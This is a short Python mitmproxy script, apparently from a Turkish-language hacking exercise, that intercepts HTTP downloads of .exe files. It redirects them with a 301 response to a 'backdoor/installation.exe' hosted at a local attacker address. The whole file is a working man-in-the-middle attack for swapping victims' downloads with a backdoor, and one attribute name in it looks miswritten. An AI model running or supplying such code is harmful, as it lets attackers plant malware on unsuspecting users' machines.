import mitmproxy

def request(flow):
	if flow.request_host != "192.168.1.15" and flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/installation.exe"})
		
		
		
		
		#1-HTTP STATUS 301
		#2-İçerik
		#3-Dosyanın Konumu
